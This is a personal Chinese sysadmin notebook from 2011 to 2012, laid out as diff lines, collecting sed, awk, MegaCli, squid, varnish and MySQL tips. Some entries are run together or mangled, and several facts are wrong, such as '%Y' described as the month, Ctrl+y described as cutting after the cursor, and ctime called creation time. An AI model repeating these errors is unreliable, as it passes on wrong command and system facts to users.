+软路由 ISA+Bandwidth Splitter
+
+---------------------------------2011.12.16--------------------------------------
+扶凯  蓝讯 转 土豆
+my_FTP () {	echo "cd $RHOST_BASH_DIR	$CMD	bye" | lftp -u ${USER_NAME},${PASSWORD} sftp://${RHOST_IP}}CMD="nlist $REQ_DIR | grep -E $REQ_FILE | wc -l"#echo $CMDmy_FTP $CMD
+
+---------------------------------2011.12.19--------------------------------------
+echo "00ac45d5082f"|sed 's/\(^.\{2\}\)\?\(..\)/\1:\2/g'  等价于 sed 's/\(^.\{2\}\)\{0,1\}\(..\)/\1:\2/g'
+
+c 语言常用   链表，队列，栈，数组,AVL树，红黑树，二叉堆，伸展树,插入排序，快速排序，归并排序
+
+---------------------------------2011.12.20----------------------------------------
+cfengine就类似于puppet了
+mono可以在linux上跑.net
+系统打包 tar cvpzf centos.tar.gz --exclude=/centos.tar.gz --exclude=lost+found --exclude=/media --exclude=/proc/  /
+
+---------------------------------2011.12.21-----------------------------------------
+echo "222 2 2 1 2 2 1 3"|sed 's/\(.*\)2\([^2]*\)/\1a\2/'  222 2 2 1 2 a 1 3不管最后一个2后面还有啥，只要不是2，就改成aecho "222 2 2 1 2 222 1 3"|sed 's/\(.*\)2\([^2]*\)/\1a\2/'  222 2 2 1 2 22a 1 3 包括多个2的最后一个
+echo "222 2 2 1 2 222 1 3"|sed 's/2\([^2]*\)$/a\1/'sed -n 'H;${g;s/\n//g;p}' 替换 回车
+cat -A file  可显示换行符 Windows ^M$  unix/linux $ dos2unix可转换
+
+MegaCli
+这工具好用吗
+MegaCli常用参数组合介绍：
+MegaCli -cfgdsply -aALL | grep “Error”                  【正常都是0】
+MegaCli -LDGetProp -Cache -LALL -a0                 【写策略】
+MegaCli -cfgdsply -aALL   | grep “Memory”          【内存大小】
+
+MegaCli -LDInfo -Lall -aALL                         【查RAID级别】
+MegaCli -AdpAllInfo -aALL                           【查RAID卡信息】
+MegaCli -PDList -aALL                                     【查看硬盘信息】
+MegaCli -AdpBbuCmd -aAll                           【查看电池信息】
+MegaCli -FwTermLog -Dsply -aALL           【查看RAID卡日志】
+
+MegaCli -adpCount                                    【显示适配器个数】
+MegaCli -AdpGetTime –aALL               【显示适配器时间】
+MegaCli -AdpAllInfo -aAll                     【显示所有适配器信息】
+MegaCli -LDInfo -LALL -aAll                【显示所有逻辑磁盘组信息】
+MegaCli -PDList -aAll                               【显示所有的物理信息】
+
+MegaCli -AdpBbuCmd -GetBbuStatus -aALL |grep “Charger Status” 【查看充电状态】
+
+MegaCli -AdpBbuCmd -GetBbuStatus -aALL                      【显示BBU状态信息】
+MegaCli -AdpBbuCmd -GetBbuCapacityInfo -aALL        【显示BBU容量信息】
+MegaCli -AdpBbuCmd -GetBbuDesignInfo -aALL            【显示BBU设计参数】
+MegaCli -AdpBbuCmd -GetBbuProperties -aALL             【显示当前BBU属性】
+MegaCli -cfgdsply -aALL 
+
+查看物理内存 dmidecode | grep -P -A 5 "Memory\s+Device" | grep Size | grep -v Range |grep MB
+ dmidecode -t memory |grep -i size
+
+-----------------------------------2011.12.22-----------------------------------------
+cherokee 是目前最快的 Web 服务器软件 不成熟 玩玩可以
+[root@TestSizeServer ~]# cat 1.txt 
+1 1 1 1
+2 2 2 2
+3 3 3 3
+3 3 3 3
+4 4 4 4
+5 5 5 5
+[root@TestSizeServer ~]# sed '/4/h;$G' 1.txt 
+1 1 1 1
+2 2 2 2
+3 3 3 3
+3 3 3 3
+4 4 4 4
+5 5 5 5
+4 4 4 4
+
+pssh su 实现方法 sed -i -e '/Defaults    env_reset/s/env_reset/!env_reset/; /Defaults    requiretty/s/requiretty/!requiretty/' /etc/sudoers
+
+------------------------------------2011.12.23--------------------------------------------
+sh -x 脚本  查看执行过程
+ROSpfsensemonowall 软路由
+echo "http://apk.goapk.com/jtf0/6604eab076d14cd0d4a72279bef0c61_0.jpg" |sed 's/^.*\(com\|net\|cn\|net\|org\)\/\(.*\)\/.[^/]\+$/\2/'   取中间jtf0
+
+------------------------------------2011.12.26-----------------------------------------------
+cat /sys/class/net/eth0/address 查看eth0 mac
+500是代码错误 502是代理的问题 504一般就是数据库问题
+http://sourceforge.net/projects/denyhosts/files/ 可解决 ssh 爆破
+echo "20111227170000" |sed 's/\(....\)\(..\)\(..\)\(..\)\(..\)/\1-\2-\3 \4:\5:/' 输出格式转化 2011-12-27 17：00：00
+awk '{printf("%s-%s-%s %s:%s:%s\n",substr($1,1,4),substr($1,5,2),substr($1,7,2),substr($1,9,2),substr($1,11,2),substr($1,13,2))}' awk版
+
+------------------------------------2011.12.27-----------------------------------------------
+awk systime() 显示当前时间 格林尼日时间 
+strftime（%y-%m-%d）
+%as	星期几的缩写(Sun)
+%A	星期几的完整写法(Sunday)
+%b	月名的缩写(Oct)
+%B	月名的完整写法(October)
+%c	本地日期和时间
+%d	十进制日期
+%D	日期 08/20/99
+%e	日期,如果只有一位会补上一个空格
+%H	用十进制表示24小时格式的小时
+%I	用十进制表示12小时格式的小时
+%j	从1月1日起一年中的第几天
+%m	十进制表示的月份
+%M	十进制表示的分钟
+%p	12小时表示法(AM/PM)
+%S	十进制表示的秒
+%U	十进制表示的一年中的第几个星期(星期天作为一个星期的开始)
+%w	十进制表示的星期几(星期天是0)
+%W	十进制表示的一年中的第几个星期(星期一作为一个星期的开始)
+%x	重新设置本地日期(08/20/99)
+%X	重新设置本地时间(12：00：00)
+%y	两位数字表示的年(99)
+%Y	当前月份
+%Z	时区(PDT)
+%%	百分号(%)
+
+unix/linux 权威教程 第三版shell  学习教程
+ssh-keyscan -T 的默认值啦是5S
+awk 'NR==FNR{a[$1];next}{if($0 in a)print $0}' 将file里面第一列等于file2第一列的打印出来
+squid 两种更新方法 第一种是http的更新 第二种是refresh_pattern 
+-------------------------------2011.12.28-------------------------------------
+学c语言先看《c primer plus》不用深究，知道有哪些东西就行，这书以后可以当工具书。然后看K&R那本c程序设计语言（绝对不是谭浩强的），这本书虽然相当薄，但精华内容非常多，要多研究
+以后c有一定基础可以看APUE，还有《c和指针》《c陷阱与缺陷》《c专家编程》三本中的一本basename 去掉前导的目录部分后打印“名称”。如果指定的话，还会去掉尾随的“后缀”。
+dirname 去掉名称打印目录
+
+start time:2011-12-25 09:30:07
+end time:2011-12-25 09:30:07
+outip:  121.41.129.151
+outport:46308
+deip:   125.93.80.225
+deport: 135
+protocal:tcp
+
+start time:2011-12-25 09:30:07
+end time:2011-12-25 09:30:07
+outip:  121.41.129.151
+outport:46308
+deip:   125.93.80.225
+deport: 135
+protocal:tcp
+
+start time:2011-12-25 09:30:07
+end time:2011-12-25 09:30:07
+outip:  121.41.129.151
+outport:46308
+deip:   125.93.80.225
+deport: 135
+protocal:tcp
+
+要把每一段的7行内容合并成一行，并且删除 start time , end time之间的空格，使之变为starttime endtime :
+start time:2011-12-25 09:30:07	end time:2011-12-25 09:30:07	outip:  121.41.129.151	outport:46308	deip:   125.93.80.225	deport: 135	protocal:tcp	
+start time:2011-12-25 09:30:07	end time:2011-12-25 09:30:07	outip:  121.41.129.151	outport:46308	deip:   125.93.80.225	deport: 135	protocal:tcp	
+start time:2011-12-25 09:30:07	end time:2011-12-25 09:30:07	outip:  121.41.129.151	outport:46308	deip:   125.93.80.225	deport: 135	protocal:tcp
+
+awk 方法：awk '{if($0==""){printf "\n"}else{printf $0"\t"}}'
+	  awk '{ORS=$0==""?"\n":" ";}1'
+sed 方法：sed -e 'N;N;N;N;N;N;N;s/\n/ /g' -e 's/ time/time/g'
+
+squid 和 varnish 优缺点
+squid squid天生是单进程的所以不能利用多核，代码写的不好比较乱，天生不支持模块扩展
+varnish  varnish是工作线程 nginx是工作进程线程万一崩了，主线程也完了
+
+win类是epoll 的 io iocp
+
+查看多文件 不现实文件名  cat xxx|grep 或 grep -h
+iozone 测试硬盘io
+rev 反转一行的排序
+
+------------------------------2011.12.29---------------------------------------
+一机多tomcat在catalina.sh加入
+JAVA_HOME=/usr/java/jdk1.6.0_21
+CATALINA_HOME=/usr/local/tomcat8888
+用shell在/usr/local下 建立20个子目录 xunlei1-xunlei20,再在这20个子目录下分别建255个子目录dir1-dir255,再在255个子目录下创建10000个文件xunlei1.html-xunlei10000.html
+mkdir -p /usr/local/xuelei{1..20}/dir{1..255} ; touch /usr/local/xuelei{1..20}/dir{1..255}/xunlei{1..1000}.html
+Nginx SMP 对称多处理 充分发挥多核cpu的优势
+
+------------------------------2011.12.30-------------------------------------------------------
+tar zcvf xxx.tar.gz A --exclude=A/B 打包 文件不抱扩A/B
+echo "123213215413543" |sed  'y/123/234/' 结果  234324325424544
+
+------------------------------2011.12.31----------------------------------------------
+tail /var/log/secure -n 20 root登录日志
+##################################
+import subprocess
+a = subprocess.Popen('w',shell=True,stdout=subprocess.PIPE)
+data = a.stdout.read()
+print data
+######################################
+把执行命令的结果赋值给变量
+缺陷跟踪系统 Eventum
+去除重复行 sort -u
+
+-------------------------------2012.1.5------------------------------------------------
+squidclient -p 8088 mgr:info （启在8088） squid 查询
+squid是method加uri做md5哈希refresh_patternacl校验找缓存对象，都很耗cpu但是具体的瓶颈跟实际情况相关比较大也可能是磁盘io太慢，也可能是网络状况不好很多方法可以提升性能但是需要功底例如小文件使用coss文件系统减少磁盘碎片，减少open和unlink的次数，可以提升性能acl规则配置合理可以减少cpu使用率
+-------------------------------2012.1.9-------------------------------------------------
+ext3grep linux 反删除软件
+echo "ahebhaaa" |awk -F "" '{for(i=1;i<=NF;i++)a[$il=asorti(a,b);for(i=1;i<=l;i++) printf a[b[i]]b[i];printf "\n"}'
+
+	from optparse import OptionParser
+	parser = OptionParser()
+
+	parser.add_option("-a", "--address", dest="address", default='localhost', help="ADDRESS for server",metavar="ADDRESS")
+	parser.add_option("-p", "--port", dest="port1", type="int", default=80, help="PORT for server", metavar="PORT1")
+
+(options, args) = parser.parse_args()
+
+1 适应社会 2 充分发挥自我才智 3 娱乐和锻炼以及保持身心健康
+网中人十三问
+ll 按时间排序
+默认是 ll －t   
+如果 ll －t 是升序， 
+那么 ll －t ｜ tac 就是降序
+
+-----------------------------2012.1.10-------------------------------------------------
+yum install lrzsz  安装 sz rz
+
+-----------------------------2012.1.11-----------------------------------------------
+sed单行处理命令 输出文本中的偶数和奇数行
+一：sed实现
+1 1.sed -n 'p;n' file  
+2 2.sed -n 'n;p' file 
+二：(这种方法更通用一点)
+1 1.sed -n '1~2p' file  
+2 2.sed -n '2~2p' file 
+
+-----------------------------2012.1.12--------------------------------------------------
+运行---cmd----systeminfo 
+Nessus漏洞扫描
+aide
+
+-----------------------------2012.1.13-----------------------------------------------------------
+ISO镜像mount –o loop /home/danny/CentOS-5.5-i386-bin-DVD.iso   /mnt/iso
+光盘挂载mount /dev/cdrom /media
+
+-----------------------------2012.1.18------------------------------------------------------------
+yum provides *bin/bc 查看命令属于哪个包
+
+-----------------------------2012.1.30------------------------------------------------------
+linux tr 替换命令
+
+-----------------------------2012.1.31--------------------------------------
+一个Linux进程分几个段？
+text段，存放代码的
+data段，存放全局初始化非0的变量
+bss段，存放全局未初始化变量
+heap段，堆内存
+mmap，内存映射，动态库加载的位置
+stack，栈区
+kernel，内核区（1G）除了内核区，剩下的都是用户区，用户区在
+32位机器上都是3G的空间
+使用mmap 可以避免碎片 通常的内存碎片最可能的是小内存申请和释放，而且基本都集中在heap区而mmap是大内存区，最小是一个page_size的大小在32位系统下是4k并且和heap不是一个区，所以不存在内存碎片问题
+
+------------------------------2012.2.1--------------------------------------------
+彩虹表就是一个庞大的、针对各种可能的字母组合预先计算好的哈希值的集合，不一定是针对MD5算法的，各种算法的都有，有了它可以快速的破解各类密码。越是复杂的密码，需要的彩虹表就越大，现在主流的彩虹表都是100G以上。
+
+------------------------------2012.2.3---------------------------------------
+互联网上的蜘蛛　　google蜘蛛： googlebot　　百度蜘蛛：baiduspider　　yahoo蜘蛛：slurp　　alexa蜘蛛：ia_archiver　　msn蜘蛛：msnbot　　altavista蜘蛛：scooter　　lycos蜘蛛： lycos_spider_(t-rex)　　alltheweb蜘蛛： fast-webcrawler/　　inktomi蜘蛛： slurp
+
+------------------------------2012.2.6-------------------------------------------
+#vi /etc/fstab
+tmpfs       /dev/shm    tmpfs  defaults   0   0
+更改为
+tmpfs       /dev/shm    tmpfs  defaults,size=512m   0    0
+[root@GoGo tmp]# mount -o remount /dev/shm
+修改 /dev/shm 大小
+
+不同文件系统适合不同应用  图片找个分布式  或者xfsmysql主要看硬盘和文件系统的Io吞吐量而且你要看数据的
+
+mysql 单行命令 echo "show databases;" | mysql -uroot  -S /tmp/mysql.sock 可不加-S 
+		mysql -u root -p'oldboy' -S /data1/3307/mysql.sock -e "show databases;"
+
+
+-------------------------------2012.2.7---------------------------------------------
+join 可把连个文件 第一行相同的 连接 join -o 1.1 1.2 2.2 1.txt 2.txt 
+
+
+sort 不加 -n 先对第一个排列 在对后几个拍 -r 倒序
+
+1，查明登陆端口；
+# who
+root pts/1 Apr 8 00:06 (172.29.0.29)
+root pts/2 Apr 8 04:15 (172.29.0.21)
+
+2，通知该用户将要关闭他：
+# echo "I will close your connection" > /dev/pts/2
+这样他的终端将显示该信息。
+
+3，关闭用户连
+# fuser -k /dev/pts/1 
+
+当前文件的监控的端口号 netstat -ntlp |sed  -n '/^tcp/{G;s/.*:\([0-9]\+\).*\n/\1,/;h;g;$s/,$//p}'
+
+------------------------------2012.2.9-------------------------------------------------
+/proc/pid/status 查看进程详细信息
+
+\w 匹配字母或数字或下划线或汉字
+\s 匹配任意的空白符
+\d 匹配数字
+\b 匹配单词的开始或结束
+
+------------------------------2012.2.10-------------------------------------------------
+cat /proc/loadavg |sed 's/.*\/\([0-9]\+\) .*/\1/' 查看当前进程数
+watch 事实监控一个命令的运行情况
+
+------------------------------2012.2.16-----------------------------------------------
+Memcached的代理服务器软件——magent
+echo '111 222 111 111 111' | sed 's/111/333/4'
+basename /usr/local/src 显示最后一个 src
+dirname 取得路径中目录部分
+sort -r +2 file 跳过前两栏
+cut -c1-2 抽取文件中1到2 字节内容 1，3 第一个和第三个
+paste 列转行
+cut -d： -f1-2 /etc/passwd 以：为分隔符 抽取 前两个域
+tee test.log 有清空，没有新建 -a 追加
+comm 比较排好的文件 
+su - user 彻底改变用户 logname和user 都改边
+declare -x 变量=内容 与 export类似
+declare -r 变量值不能改变
+kill -1 重启 = HUP  -2 中断=INT -15 终止=TERM（默认） -9 强关=KILL -19 暂停=STOP -18 继续=CONT
+
+-----------------------------2012.2.17---------------------------------------------------
+mksock 简历 socket文件
+stat 取文件的
+
+linux文件的13个属性：
+1、设备编号
+2、inode编号
+3、文件模式
+4、连接文件数量
+5、文件拥有者编号
+6、文件群组编号
+7、设备标识符
+8、文件大小ind时间 atime
+10、修改时间 mtime
+11、改变模式时间 ctime
+12、区块大小
+13、配置区块数
+
+查询用 stat 查询文件系统 用stat -f  
+stat -c %a  获取文件爱你权限
+bonding 可绑定多网卡
+dump 备份
+
+-----------------------------2012.2.20------------------------------------------------------
+mysql 配置文件
+skip-locking  避免外部锁，减少出错几率，增强稳定性
+skip-name-resolve  禁用dns解析
+show variables like '%slow%'; 查看满查询是否开启
+show global status like ‘%slow%’； 查看慢查询条数
+show variables like 'max_connections' mysql 设置的最大连接数
+show global like 'max_used_connections' mysql 过去已连接的最大连接数
+
+-----------------------------2012.02.22---------------------------------------
+hdparm  补充说明：hdparm可检测，显示与设定IDE或SCSI硬盘的参数。
+
+参　　数：
+-a<快取分区> 设定读取文件时，预先存入块区的分区数，若不加上<快取分区>选项，则显示目前的设定。
+-A<0或1> 启动或关闭读取文件时的快取功能。
+-c<I/O模式> 设定IDE32位I/O模式。
+-C 检测IDE硬盘的电源管理模式。
+-d<0或1> 设定磁盘的DMA模式。
+-f 将内存缓冲区的数据写入硬盘，并清楚缓冲区。
+-g 显示硬盘的磁轨，磁头，磁区等参数。
+-h 显示帮助。
+-i 显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供。
+-I 直接读取硬盘所提供的硬件规格信息。
+-k<0或1> 重设硬盘时，保留-dmu参数的设定。
+-K<0或1> 重设硬盘时，保留-APSWXZ参数的设定。
+-m<磁区数> 设定硬盘多重分区存取的分区数。
+-n<0或1> 忽略硬盘写入时所发生的错误。
+-p<PIO模式> 设定硬盘的PIO模式。
+-P<磁区数> 设定硬盘内部快取的分区数。
+-q 在执行后续的参数时，不在屏幕上显示任何信息。
+-r<0或1> 设定硬盘的读写模式。
+-S<时间> 设定硬盘进入省电模式前的等待时间。
+-t 评估硬盘的读取效率。
+-T 平谷硬盘快取的读取效率。
+-u<0或1> 在硬盘存取时，允许其他中断要求同时执行。
+-v 显示硬盘的相关设定。
+-W<0或1> 设定硬盘的写入快取。
+-X<传输模式> 设定硬盘的传输模式。
+-y 使IDE硬盘进入省电模式。
+-Y 使IDE硬盘进入睡眠模式。
+-Z 关闭某些Seagate硬盘的自动省电功能。
+
+硬件raid： 最佳的办法是通过已安装的raid厂商的管理工具来查看，有cmdline，也有图形界面。如Adaptec公司的硬件卡就可以通过下面的命令进行查看：
+
+# /usr/dpt/raidutil -L all
+
+可以看到非常详细的信息。
+
+当然更多情况是没有安装相应的管理工具，只能依靠Linux本身的话一般我知道的是两种方式：
+
+# dmesg |grep -i raid
+
+# cat /proc/scsi/scsi
+
+显示的信息差不多，raid的厂商，型号，级别，但无法查看各块硬盘的信息。
+
+--------------------------------2012.2.23-------------------------
+慢 ip 211.144.11.62
+
+--------------------------------2012.2.24--------------------
+/usr/bin/time -v date 可以查看 linux的默认页面大小
+netperf 测试万卡的吞吐率 c/s 架构的
+./mysqladmin -pstrongmail processlist 查询mysql 耗时最长的语句
+squid的牛人，斯文现在在盛大了
+DNS的牛人，李孟现在在百度
+python 倒序切片  foollist[::-1]
+\bthe\b 匹配边界 只有the
+\Bthe  不宜the开头 但包含the
+
+--------------------------------2012.2.27-------------------------------
+I/O 调度算法再各个进程竞争磁盘I/O的时候担当了裁判的角色。他要求请求的次序和时机做最优化的处理，以求得尽可能最好的整体I/O性能。
+    下面列出4种调度算法：
+        CFQ (Completely Fair Queuing 完全公平的排队)(elevator=cfq)： 这是默认算法，对于通用服务器来说通常是最好的选择。它试图均匀地分布对I/O带宽的访问。
+        Deadline (elevator=deadline)： 这个算法试图把每次请求的延迟降至最低。该算法重排了请求的顺序来提高性能。
+        NOOP (elevator=noop): 这个算法实现了一个简单FIFO队列。他假定I/O请求由驱动程序或者设备做了优化或者重排了顺序(就像一个智能控制器完成的工作那样)。在有些SAN环境下，这个选择可能是最好选择。
+        Anticipatory (elevator=as): 这个算法推迟I/O请求，希望能对它们进行排序，获得最高的效率。对于桌面工作站来说，这个算法可能是一个不错的选择，但对服务器则很少会理想。
+# cat /sys/block/{DEVICE-NAME}/queue/scheduler
+# cat /sys/block/sda/queue/scheduler
+# echo {SCHEDULER-NAME} > /sys/block/{DEVICE-NAME}/queue/scheduler
+# echo noop > /sys/block/hda/queue/scheduler
+
+--------------------------------2012.2.29-----------------------------
+cat /var/lock/subsys/ 查看启动目录
+c-h-i-n-a -unix  结果  china -unix  sed -r ':;s/-(.* .*)/\1/;t' file
+
+--------------------------------2012.03.02--------------------------------
+sed -i '/^H/s/=.*/=other/' /etc/sysconfig/network  修改hostname
+cp -v 显示过程
+
+--------------------------------2012.03.05---------------------------
+nfs 挂在需启动 service portmap start
+<Context path="" docBase="vegaga_sou-1.0.1" />  tomcat 需要
+
+--------------------------------2012.03.06---------------------------
+rfork_thread.S  是汇编
+
+--------------------------------2012.03.07----------------------------
+http://www.baidu.com/search/url_submit.html谷歌Google提交入口：http://www.google.com/addurl雅虎Yahoo 提交入口：http://search.help.cn.yahoo.com/h4_4.html
+搜狐Sogou 提交入口：http://www.sogou.com/docs/help/webmasters.htm#01
+网易Yodao 提交入口：http://tellbot.yodao.com/report
+微软MSN Live Search 提交入口：http://search.msn.com/docs/submit.aspx?FORM=WSDD2
+新浪免费登录入口 http://bizsite.sina.com.cn/newbizsite/docc/index-2jifu-09.htm 
+中国搜索登陆入口 http://service.chinasearch.com.cn/NetSearch/user_register/user_register.jspTOM搜索* http://search.tom.com/tools/weblog/log.php腾迅Soso 提交入口：由于Soso搜搜网页搜索的搜索结果来自合作伙伴Google谷歌，因此关于网站收录与排序的问题，请查看谷歌相应的帮助文档。 
+
+看你的mysql现在已提供什么存储引擎:
+mysql> show engines;
+
+看你的mysql当前默认的存储引擎:
+mysql> show variables like '%storage_engine%';
+
+你要看某个表用了什么引擎(在显示结果里参数engine后面的就表示该表当前用的存储引擎):
+mysql> show create table 表名
+
+mysql 5.5 配置文件  cp /usr/share/mysql/my-medium.cnf　/etc/my.cnf
+
+auto_increment mysql自增
+
+-------------------------------2012.03.08--------------------------------
+nmap -sP 192.168.88.1-254 查看存活的ip
+https://github.com/yahoo/l3dsr 类似lvs的负载软件
+tcp/ip illustrated tcp/ip 书
+单台机器网卡流量超过100M以上分析nginx日志攻击源的user-agent是一样的
+------------------------------2012.03.13--------------------------------
+ aiCache 一款优秀的缓存软件类似varnish
+
+------------------------------2012.03.14-------------------------------
+能which的都是外部程序
+
+------------------------------2012.03.15-----------------------------------
+sersync 数据同步软件
+
+------------------------------2012.03.20----------------------------------------
+fuser -mk /mount
+unmoun /mount  强制 卸载
+同一台设备，不同服务进程可以绑定同一端口么？孙鹤<sunheqiubai@qq.com>  17:05:30可以但是ip要不同好像还要把套接字设置成reuse属性但是一般都不这么干
+------------------------------2012.03.21--------------------------
+./ -name firsh.sh -exec mv {} /usr/local/src/ \;  把find到的东西移动到特定目录
+blkid 看分区的UUID 
+1、含义：
+  文件的 Access time，atime 是在读取文件或者执行文件时更改的；
+  文件的 Modified time，mtime 是在写入文件时随文件内容的更改而更改的；
+  文件的 Create time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。
+ 
+ 
+2、文件各种事件标记的显示方法
+ 
+  ls -lc filename         列出文件的 ctime 
+  ls -lu filename         列出文件的 atime 
+  ls -l filename          列出文件的 mtime  
+
+3、某网友的实际试验结果：
+ 
+  修改文件,-mtime 改了, -ctime 也会改.
+  访问文件,-atime 改了, -ctime 没变.
+  chown, chgrp, chmod,mv, 都会使 -ctime 改变,但不影响 -atime 和 -mtime.
+  touch 可以改 -mtime and/or -atime,但 touch -a 只改访问时间时,-ctime也改了.
+  touch -m 改修改时间时,-ctime当然也改了
+ 
+--------------------------------2012.03.26-----------------------------------------------
+PR 就是 Priority 的简写，而 NI 是 nice 的简写。这两个值决定了PR的值，PR越小，进程优先权就越高，就越“优先执行”。换算公式为：PR(new) = PR(old) + NI
+Tokyo Tyrant支持双机互为主辅模式 持久存储的 memcache
+Shc 可加密shell脚本  CFLAGS=-static shc -r -f test.sh 静态文件
+
+nagios 脚本返回值意义
+0 ok  1 warning  2 critical  3 unknown
+
+nginx 图形监控工具 http://soft.vpser.net/status/nginx-rrd/nginx-rrd-0.1.4.tgz
+画图工具  Xmind
+
+c primer plus  c语言学习书
+
+memcache 和 redis 区别
+简单做了总结：
+
+分布式方面，设定memcache集群，利用magent做一主多从，Redis支持数据的备份，即master-slave模式的数据备份。
+
+ 存储数据安全方面，memcache断电就断了，数据没了；redis可以定期save到磁盘
+
+ 灾难恢复方面，memcache断电就断了，redis丢了后可以通过aof恢复。
+
+ 虚拟内存方面，redis支持，当物理内存用完时，可以将一些很久没用到的value交换到磁盘，而memcache不行。
+
+数据结构方面，redis支持更多的数据结构。
+
+性能方面，Redis和Memcache在写入性能上面差别不大，读取性能上面，尤其是批量读取性能上面Memcache胜出，memcached处理并发能力要比redis强，但redis的连接速度要比memcached强。
+
+---------------------------------2012.03.27---------------
+31.209423,121.411714 google 做标
+grep -oP '(\d+\.){3}\d+:\d+' 取ip和端口
+http://www.cpubenchmark.net/cpu_list.php cpu 型号阵脚
+python web rails
+ethtool 查看 网卡情况
+登陆proxy + ldap + ssh key 登录验证方案
+
+---------------------------------2012.03.28---------------------
+高效的系统管理：2010年十大Linux运维小窍门
+http://hi.baidu.com/quanzhou722/blog/item/d2f3f501c88465c9267fb57b.html
+系统管理员都应该知道的系统常识
+http://hi.baidu.com/quanzhou722/blog/item/04d77ed72e2475c2a044df73.html
+系统运维秘诀：变化，监控，扩展（技术篇）
+http://hi.baidu.com/quanzhou722/blog/item/ffc07508463dfd2fe8248871.html
+
+---------------------------------2012.03.29--------------------------
+去除重复行  sed -n '$!N;/\(.*\n\)\1/!P;'   awk '!a[$0]++‘
+varnish 暗转出错  方法 ：export echo=echo  
+sed 小写转大写 echo 'abcadfasdf'|sed 's/.*/\U&/'
+
+iptraf  不错的网络工具
+stat  -c %a  file  以数字形式产看权限
+tcpdump -n  打印ip而非主机名
+arp -s 添加主机mac 映射
+
+---------------------------------2012.03.30---------------------------------
+find . -prune 只查找目录
+http://code.google.com/p/ustats/ nginx 负载检测模块
+读写分离 mmm
+echo ni shi shui wo shi h|sed '/\n/!G;s/\([^ ]* \)\(.*\n\)/&\2\1/g;//D;s/\n/ /'  反转输出
+bepapa.cn 
+
+http://loadimpact.com/  在线服务器 测试
+nmap -sP 192.168.1.1-255  扫描存货 ip
+
+Ctrl + a - 返回到当前命令的开始
+Ctrl + e - 返回到当前命令的末尾
+Ctrl + w - 删除光标左边的第一个条目（变量或者命令）
+Ctrl + u - 剪切光标前面的所有内容
+Ctrl + y - 剪切光标后面的所有内容
+Ctrl + y - 粘贴你用Ctrl +u或者Ctrl + y剪切的内容
+Ctrl + p - 滚动显示以前的命令
+Ctrl + n - 下一个命令
+Ctrl + l - 清屏
+
+-----------------------------------2012.03.31----------------
+官网 http://www.lilyproject.org/lily/index.html
+HBase+Hadoop+Solr=Lily
+\b非字符当边界
+\B字符当边界
+netstat -r 显示路由表
+http://mobile.yougou.com/ 优购后台
+
+---------------------------------2012.04.01----------------------
+http://www.google.cn/landing/shuixia/ google 水下搜索
+[root@localhost tmp]# netstat -r
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+192.168.1.0     *               255.255.255.0   U         0 0          0 eth0
+169.254.0.0     *               255.255.0.0     U         0 0          0 eth0
+default         vrouter         0.0.0.0         UG        0 0          0 eth0
+
+U 该路由可以使用
+G 路由是到一个网关，如果没设说明是直连
+H 该路由是到一个主机，如果没有设置说明到的是一个网络
+D 该路由是由重定向报文创建（不常见）
+M 该路由已被重定向报文创建的（不常见）
+
+route add default 192.168.1.1 1 添加默认网关  1代表G 网关 0不设置G 标签
+/etc/default/useradd  配置建立用户的默认信息
+
+strace -c 打印报表
+
+所有文件都有3个时间信息,保存在文件系统中
+da
+atime (Access time)是文件最后一此读的时间 或者执行文件的时间
+mtime (Modified time)是文件最后一次写的时间(是在写入文件时随文件内容的更改而更改的)
+ctime (Create time)是i-node信息最后一次写的时间.写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的
+
+更改文件的内容即会更改 mtime 和 ctime , atime不一定被更改 如清空文件 >temp
+ctime 可能会在 mtime 未发生任何变化时更改--在权限更改，但是文件内容没有变化的情况下  更改文件名时 也是ctime改变mtime不变 
+修改mtime一般都会改ctime  , 但是touch -tm time file 就只改modified time 而不改ctime
+
+
+-------------------------------2012.04.05------------------------------------
+分享一下经验
+
+
+在高并发情况下，varnish不提供服务，wget去下载http一直等待回应，同时流量异常，表现为流量往下掉，上不去。并且varnishlog会看到如下信息。
+No more "Create worker thread failed 11 Resource temporarily" messages.
+
+即使你在varnish启动配置文件中把线程数设置为最大50000 -p thread_pool_max=5000，结果在varnishstat中查看n_wrk_create - N worker threads created 也不会超过1024,并且你会看到有多少个请求超出负载，drop掉了多少个请求。
+651706       157.04       220.47 N overflowed work requests
+460396       262.07       155.75 N dropped work requests
+
+解决：增加系统进程数的限制
+Centos6系centos5有些不同，操作如下
+ulimit -u 50000
+
+vi /etc/security/limits.d/90-nproc.conf
+*          soft    nproc     65535
+*          hard    nproc     65535
+
+vi /etc/security/limits.conf
+* hard nofile 65535
+* soft nofile 65535
+
+注意：次设置需要varnish重新启动才会生效。
+
+原来在linux里,nproc(在/etc/security/limits.conf中的nproc既对应ulimit的max user processes)限制的是线程数。当然因为在linux里一个进程至少包含一个线程，所以间接也起到了对进程数的限制。
+
+
+
+
+插入排序 效率 高
+插入排序，希尔排序，桶排序，堆排序，快速排序，归并排序
+
+---------------------------------------2012.04.06----------------------------
+海量要混合用
+外排序加快速排序
+拆分成内存可以容纳的序列
+然后用快排
+然后再归并排序
+
+滑动窗口理解：
+滑动窗口我的理解就是给对端一个建议
+告诉对端，我的buf还剩多大，你可以传多少
+有的时候会告诉对端我的窗口大小是0
+这个时候对端基本就停止传输了
+这个叫窗口更新
+这个抓包经常能看到
+其实一个ack也不是立即回复的
+是等待一段时间
+有的时候会跟数据一起回去
+或者好几个包，用一个ack去确认
+
+php-syslog,awstats,rsyslog   mysql sandbox
+
+# File descriptor usage:
+# 0 standard input
+# 1 file creation
+# 2 errors and warnings
+# 3 some systems may open it to /dev/tty
+# 4 used on the Kubota Titan
+# 6 checking for... messages and results
+# 5 compiler messages saved in config.log
+
+exec 5<>/dev/null
+
+-----------------------------------2012.04.09---------------------------------
+fluent+mongodb 日志收集
+linux特殊权限 ：里的特殊权限setuid，正如-rwsr-xr-x中的s  普通用户运行时就拥有所有者权限
+特殊权限stick bit（粘贴位）权限，正如drwxrwxrwt中的最后一个t  除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录。
+setuid：chmod u+s xxx
+setgid: chmod g+s xxx
+stick bit : chmod o+t xxx
+或者使用八进制方式，在原先的数字前加一个数字，三个权限所代表的进制数与一般权限的方式类似，如下:
+suid   guid    stick bit
+  1        1          1
+所以：suid的二进制串为：100，换算十进制为：4
+guid的二进制串为:010,换算：2
